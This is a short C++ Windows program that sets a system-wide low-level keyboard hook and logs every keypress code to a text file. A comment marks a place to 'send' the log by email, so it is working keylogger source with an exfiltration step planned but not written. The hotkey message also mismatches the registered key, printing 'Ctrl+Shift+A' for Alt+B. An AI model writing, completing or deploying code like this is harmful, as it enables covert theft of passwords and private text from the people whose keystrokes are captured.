#include <windows.h>    
#include <stdio.h>
#include <iostream>
#include <fstream>

HHOOK g_hHook;
using namespace std;
#pragma comment(lib,"user32.lib") 

ofstream ddout("d:/tmp/type.txt", std::ios::out);  

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
            // Process key press
            // Example: Print the virtual key code
            ddout << "Key pressed: " << pKey->vkCode << std::endl;
            printf("Key pressed: %d\n", pKey->vkCode);
            //send meial
        }
    }
    return CallNextHookEx(g_hHook, code, wParam, lParam);
}

int main() {
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    if (g_hHook == NULL) {
        printf("Error setting hook\n");
        return 1;
    }

    if (RegisterHotKey(
        NULL,
        1,
        MOD_ALT | MOD_NOREPEAT,
        0x42))  //0x42 is 'b'
    {
        printf(("Hotkey 'ALT+b' registered, using MOD_NOREPEAT flag\n"));
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_HOTKEY) {
            // Handle the hotkey
            if (msg.wParam == 1) {
                printf("Ctrl+Shift+A pressed\n");
            }
            UnhookWindowsHookEx(g_hHook);
            return 0; // Exit the application on hotkey press
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }


    UnhookWindowsHookEx(g_hHook);
    return 0;
}